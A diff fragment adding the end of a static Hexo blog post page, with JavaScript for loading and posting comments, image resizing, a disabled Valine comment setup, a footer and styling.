+                    let authorHtml = `<span class="comment-author">${escapeHtml(comment.nickname)}</span>`;
+                    if (comment.website) {
+                        authorHtml = `<a href="${escapeHtml(comment.website)}" target="_blank" class="comment-author">${escapeHtml(comment.nickname)}</a>`;
+                    }
+
+                    div.innerHTML = `
+                        <div class="comment-header">
+                            ${authorHtml}
+                            <span class="comment-date">${formatDate(comment.timestamp)}</span>
+                        </div>
+                        <div class="comment-content">${escapeHtml(comment.content)}</div>
+                    `;
+                    commentList.appendChild(div);
+                });
+            } else {
+                commentList.innerHTML = '<p>No comments yet. Be the first!</p>';
+            }
+        })
+        .catch(err => {
+            console.error('Error loading comments:', err);
+            commentList.innerHTML = '<p>Error loading comments.</p>';
+        });
+
+    // Submit comment
+    commentForm.addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        const nickname = document.getElementById('c-nickname').value;
+        const email = document.getElementById('c-email').value;
+        const website = document.getElementById('c-website').value;
+        const content = document.getElementById('c-content').value;
+
+        submitBtn.disabled = true;
+        submitBtn.innerText = 'Submitting...';
+
+        fetch(`${apiUrl}/api/comment`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                post_url: postUrl,
+                nickname: nickname,
+                email: email,
+                website: website,
+                content: content
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.message) {
+                // Add new comment to list immediately
+                const div = document.createElement('div');
+                div.className = 'comment-item';
+                div.innerHTML = `
+                    <div class="comment-header">
+                        <span class="comment-author">${escapeHtml(nickname)}</span>
+                        <span class="comment-date">Just now</span>
+                    </div>
+                    <div class="comment-content">${escapeHtml(content)}</div>
+                `;
+                
+                // Insert at the beginning or append if empty
+                if (commentList.querySelector('.comment-item')) {
+                    commentList.insertBefore(div, commentList.firstChild);
+                } else {
+                    commentList.innerHTML = '';
+                    commentList.appendChild(div);
+                }
+                
+                commentForm.reset();
+            } else {
+                alert('Error: ' + (data.error || 'Unknown error'));
+            }
+        })
+        .catch(err => {
+            console.error('Error submitting comment:', err);
+            alert('Error submitting comment');
+        })
+        .finally(() => {
+            submitBtn.disabled = false;
+            submitBtn.innerText = 'Submit';
+        });
+    });
+})();
+</script>
+
+    
+
+
+</div>
+<script>
+    window.onload = ()=>{
+
+        document.title = document.querySelector('.post-title p').innerText;
+
+        var zoomImgs = function() {
+            const images = document.querySelectorAll('.post-content img'); // Only select images in post content
+            images.forEach(img => {
+                img.style.width = '70%'
+                img.style.height = 'auto'
+            });
+        }
+
+        zoomImgs()
+    }
+    
+</script>
+    
+    <div class="footer" id="footer">
+    <p>Copyright © 2020 <a class="flink" target="_blank" rel="noopener" href="https://hexo.io">Hexo</a>-<a class="flink" target="_blank" rel="noopener" href="https://github.com/sanjinhub/hexo-theme-geek">Geek</a>.
+    </p>
+</div>
+
+<input type="hidden" id="valine_appid" value="diYBpeShV6s47KsfNez5JmBU-gzGzoHsz">
+<input type="hidden" id="valine_appKey" value="u3BEDbLDNridDApcAzJBWc9N">
+<input type="hidden" id="valine_enable" value="false">
+<input type="hidden" id="valine_placeholder" value="留下你的评论吧...">
+<input type="hidden" id="valine_avatar" value="hide">
+
+
+<script src="/libs/jquery.min.js"></script>
+
+
+<script src="/js/lightbox.js"></script>
+
+
+
+<script>
+
+    var valine_appid = $("#valine_appid").val();
+    var valine_appKey = $("#valine_appKey").val();
+    var valine_enable = $("#valine_enable").val();
+    var valine_placeholder = $("#valine_placeholder").val();
+    var valine_avatar = $("#valine_avatar").val();
+
+    if(valine_enable == 'true'){
+        // Valine initialization code only if enabled
+        if (typeof Valine !== 'undefined') {
+            new Valine({
+                el: '#vcomments',
+                appId: valine_appid,
+                appKey: valine_appKey,
+                placeholder: valine_placeholder,
+                avatar: valine_avatar,
+            })
+        }
+    }
+
+</script>
+
+<style type="text/css">
+.v * {
+    color: #698fca;
+}
+
+.v .vlist .vcard .vhead .vsys {
+    color: #3a3e4a;
+}
+
+.v .vlist .vcard .vh .vmeta .vat {
+    color: #638fd5;
+}
+
+.v .vlist .vcard .vhead .vnick {
+    color: #6ba1ff;
+}
+
+.v a {
+    color: #8696b1;
+}
+
+.v .vlist .vcard .vhead .vnick:hover {
+    color: #669bfc;
+}
+</style>
+</body>
+
+</html>
